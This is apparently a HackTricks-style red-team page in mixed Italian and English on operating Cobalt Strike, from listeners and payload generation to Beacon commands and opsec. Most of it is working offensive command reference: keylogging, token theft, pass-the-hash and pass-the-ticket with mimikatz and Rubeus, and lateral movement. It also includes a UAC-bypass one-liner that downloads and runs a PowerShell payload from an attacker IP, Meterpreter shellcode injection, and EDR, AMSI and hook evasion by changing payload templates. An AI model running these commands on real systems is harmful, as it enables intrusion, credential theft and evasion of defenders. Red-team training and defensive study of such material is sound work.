# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` poi puoi selezionare dove ascoltare, quale tipo di beacon usare (http, dns, smb...) e altro.

### Peer2Peer Listeners

I beacon di questi listener non devono comunicare direttamente con il C2; possono farlo tramite altri beacon.

`Cobalt Strike -> Listeners -> Add/Edit` poi devi selezionare i beacon TCP o SMB

* The **TCP beacon will set a listener in the port selected**. Per connettersi a un TCP beacon usa il comando `connect <ip> <port>` da un altro beacon
* The **smb beacon will listen in a pipename with the selected name**. Per connettersi a un SMB beacon devi usare il comando `link [target] [pipe]`.

### Generare e ospitare payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** per file HTA
* **`MS Office Macro`** per un documento Office con una macro
* **`Windows Executable`** per un .exe, .dll o un service .exe
* **`Windows Executable (S)`** per un **stageless** .exe, .dll o service .exe (meglio stageless che staged, meno IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Questo genererà uno script/eseguibile per scaricare il beacon da Cobalt Strike in formati come: bitsadmin, exe, powershell e python

#### Host Payloads

Se hai già il file che vuoi ospitare su un web server vai su `Attacks -> Web Drive-by -> Host File` e seleziona il file da ospitare e la configurazione del web server.

### Opzioni Beacon

<details>
<summary>Opzioni e comandi del Beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Implant personalizzati / Linux Beacons

- Un agente personalizzato deve solo parlare il protocollo HTTP/S del Cobalt Strike Team Server (default malleable C2 profile) per registrarsi/check-in e ricevere task. Implementare gli stessi URIs/headers/metadata crypto definiti nel profilo per riutilizzare la UI di Cobalt Strike per il tasking e l'output.
- Un Aggressor Script (es., `CustomBeacon.cna`) può incapsulare la generazione dei payload per il beacon non-Windows in modo che gli operatori possano selezionare il listener e produrre payload ELF direttamente dalla GUI.
- Esempi di handler di task Linux esposti al Team Server: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, e `exit`. Questi mappano agli ID di task attesi dal Team Server e devono essere implementati lato server per restituire l'output nel formato corretto.
- Il supporto BOF su Linux può essere aggiunto caricando Beacon Object Files in-process con TrustedSec's ELFLoader (https://github.com/trustedsec/ELFLoader) (supporta anche Outflank-style BOFs), permettendo post-exploitation modulare che gira nel contesto/privilegi dell'implant senza spawnare nuovi processi.
- Includi un handler SOCKS nel beacon custom per mantenere la parità di pivoting con i Windows Beacons: quando l'operatore esegue `socks <port>` l'implant dovrebbe aprire un proxy locale per instradare gli strumenti dell'operatore attraverso l'host compromesso nelle reti interne.

## Opsec

### Execute-Assembly

L'**`execute-assembly`** usa un **processo sacrificiale** con remote process injection per eseguire il programma indicato. Questo è molto rumoroso perché per iniettare dentro un processo vengono usate alcune Win APIs che ogni EDR monitora. Tuttavia, esistono alcuni tool custom che possono essere usati per caricare qualcosa nello stesso processo:

- https://github.com/anthemtotheego/InlineExecute-Assembly
- https://github.com/kyleavery/inject-assembly
- In Cobalt Strike puoi anche usare BOF (Beacon Object Files): https://github.com/CCob/BOF.NET

L'aggressor script https://github.com/outflanknl/HelpColor creerà il comando `helpx` in Cobalt Strike che colorerà i comandi indicando se sono BOFs (verde), se sono Fork&Run (giallo) e simili, o se sono ProcessExecution, injection o simili (rosso). Questo aiuta a capire quali comandi sono più stealthy.

### Agire come l'utente

Puoi controllare eventi come `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Controlla tutti i logon interattivi per conoscere le ore operative usuali.
- System EID 12,13 - Controlla la frequenza di shutdown/startup/sleep.
- Security EID 4624/4625 - Controlla i tentativi NTLM in ingresso validi/invalidi.
- Security EID 4648 - Questo evento è creato quando si usano credenziali in chiaro per il logon. Se un processo lo genera, il binario potrebbe avere le credenziali in chiaro in un file di configurazione o nel codice.

Quando usi `jump` da Cobalt Strike, è meglio usare il metodo `wmi_msbuild` per far sembrare il nuovo processo più legittimo.

### Use computer accounts

È comune che i difensori monitorino comportamenti anomali generati dagli utenti e **escludano account di servizio e computer accounts come `*$` dal loro monitoring**. Puoi usare questi account per effettuare lateral movement o privilege escalation.

### Use stageless payloads

I stageless payloads sono meno rumorosi rispetto a quelli staged perché non devono scaricare una seconda stage dal server C2. Questo significa che non generano traffico di rete dopo la connessione iniziale, rendendoli meno probabili da rilevare da difese basate sulla rete.

### Tokens & Token Store

Fai attenzione quando rubi o generi token perché potrebbe essere possibile per un EDR enumerare tutti i token di tutti i thread e trovare un **token appartenente a un utente diverso** o addirittura SYSTEM nel processo.

Questo permette di memorizzare token **per beacon** così non è necessario rubare lo stesso token più volte. Questo è utile per lateral movement o quando devi usare un token rubato più volte:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Quando ti muovi lateralmente, di solito è meglio **rubare un token piuttosto che generarne uno nuovo** o eseguire un attacco pass-the-hash.

### Guardrails

Cobalt Strike ha una funzione chiamata **Guardrails** che aiuta a prevenire l'uso di certi comandi o azioni che potrebbero essere rilevate dai difensori. I Guardrails possono essere configurati per bloccare comandi specifici, come `make_token`, `jump`, `remote-exec`, e altri comunemente usati per lateral movement o privilege escalation.

Inoltre, il repo https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks contiene controlli e idee che potresti considerare prima di eseguire un payload.

### Tickets encryption

In un AD fai attenzione alla crittografia dei ticket. Di default, alcuni tool useranno RC4 per i ticket Kerberos, che è meno sicuro di AES; in ambienti aggiornati di default si usa AES. Questo può essere rilevato dai difensori che monitorano algoritmi di crittografia deboli.

### Avoid Defaults

Quando usi Cobalt Strike, di default le SMB pipe avranno il nome `msagent_####` e `status_####`. Cambia quei nomi. È possibile controllare i nomi delle pipe esistenti da Cobalt Strike con il comando: `ls \\.\pipe\`

Inoltre, con sessioni SSH viene creata una pipe chiamata `\\.\pipe\postex_ssh_####`. Cambiala con `set ssh_pipename "<new_name>";`.

Anche negli attacchi di postex exploitation le pipe `\\.\pipe\postex_####` possono essere modificate con `set pipename "<new_name>"`.

Nei profili di Cobalt Strike puoi anche modificare cose come:

- Evitare l'uso di `rwx`
- Come funziona il comportamento di process injection (quali API verranno usate) nel blocco `process-inject {...}`
- Come funziona il "fork and run" nel blocco `post-ex {…}`
- Il tempo di sleep
- La dimensione massima dei binari da caricare in memoria
- L'impronta di memoria e il contenuto delle DLL con il blocco `stage {...}`
- Il traffico di rete

### Bypass memory scanning

Alcuni EDR scansionano la memoria per firme note di malware. Cobalt Strike permette di modificare la funzione `sleep_mask` come BOF che sarà in grado di cifrare in memoria la backdoor.

### Noisy proc injections

Quando si inietta codice in un processo questo è normalmente molto rumoroso, perché **nessun processo regolare solitamente esegue questa azione e i modi per farlo sono molto limitati**. Pertanto, può essere rilevato da sistemi di rilevamento basati sul comportamento. Inoltre, può essere rilevato anche dagli EDR che scandiscono la rete per **thread contenenti codice che non è su disco** (anche se processi come i browser con JIT fanno questo comunemente). Esempio: https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2

### Spawnas | PID and PPID relationships

Quando si avvia un nuovo processo è importante **mantenere una relazione parent-child regolare** tra processi per evitare il rilevamento. Se svchost.exe esegue iexplorer.exe sembrerà sospetto, poiché svchost.exe non è un genitore normale di iexplorer.exe in un ambiente Windows standard.

Quando un nuovo beacon viene spawnato in Cobalt Strike, di default viene creato un processo usando **`rundll32.exe`** per eseguire il nuovo listener. Questo non è molto stealthy e può essere facilmente rilevato dagli EDR. Inoltre, `rundll32.exe` viene eseguito senza argomenti, rendendolo ancora più sospetto.

Con il seguente comando di Cobalt Strike puoi specificare un processo diverso per spawnare il nuovo beacon, rendendolo meno rilevabile:
```bash
spawnto x86 svchost.exe
```
Puoi anche cambiare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profilo.

### Proxy del traffico dell'attaccante

Gli attacker a volte avranno bisogno di poter eseguire strumenti localmente, anche su macchine Linux, e fare in modo che il traffico delle vittime raggiunga lo strumento (es. NTLM relay).

Inoltre, a volte per effettuare un pass-the.hash o pass-the-ticket è più stealthy per l'attaccante **aggiungere questo hash o ticket nel proprio processo LSASS** localmente e poi pivotare da lì invece di modificare il processo LSASS di una macchina vittima.

Tuttavia, devi essere **attento al traffico generato**, poiché potresti inviare traffico non comune (Kerberos?) dal tuo processo backdoor. Per questo puoi pivotare verso un processo browser (anche se potresti essere scoperto iniettando te stesso in un processo, quindi considera un modo stealth per farlo).


### Evitare gli AV

#### AV/AMSI/ETW Bypass

Consulta la pagina:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Di solito in `/opt/cobaltstrike/artifact-kit` puoi trovare il codice e i template precompilati (in `/src-common`) dei payload che cobalt strike userà per generare i beacon binari.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con il backdoor generato (o solo con il template compilato) puoi scoprire cosa fa scattare il defender. Di solito è una stringa. Pertanto puoi modificare il codice che genera il backdoor in modo che quella stringa non compaia nel binario finale.

Dopo aver modificato il codice, esegui `./build.sh` dalla stessa directory e copia la cartella `dist-pipe/` nel client Windows in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Non dimenticare di caricare lo script aggressivo `dist-pipe\artifact.cna` per indicare a Cobalt Strike di usare le risorse dal disco che vogliamo e non quelle caricate.

#### Resource Kit

La cartella ResourceKit contiene i modelli per i payloads basati su script di Cobalt Strike, inclusi PowerShell, VBA e HTA.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con i modelli puoi trovare cosa il defender (AMSI in questo caso) non gradisce e modificarlo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando le righe rilevate si può generare un template che non verrà catturato.

Non dimenticare di caricare lo script aggressivo `ResourceKit\resources.cna` per indicare a Cobalt Strike di usare le risorse dal disco che vogliamo e non quelle caricate.

#### Function hooks | Syscall

Il function hooking è un metodo molto comune degli EDR per rilevare attività dannose. Cobalt Strike permette di bypassare questi hook usando **syscalls** invece delle chiamate standard alle Windows API tramite la config **`None`**, oppure usando la versione `Nt*` di una funzione con l'impostazione **`Direct`**, o semplicemente saltando la funzione `Nt*` con l'opzione **`Indirect`** nel malleable profile. A seconda del sistema, un'opzione può essere più stealth dell'altra.

Questo può essere impostato nel profilo o usando il comando **`syscall-method`**

Tuttavia, questo potrebbe anche generare rumore.

Un'opzione fornita da Cobalt Strike per bypassare gli hook è rimuoverli con: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Puoi anche controllare quali funzioni sono hookate con [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) o [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Comandi vari di Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Riferimenti

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
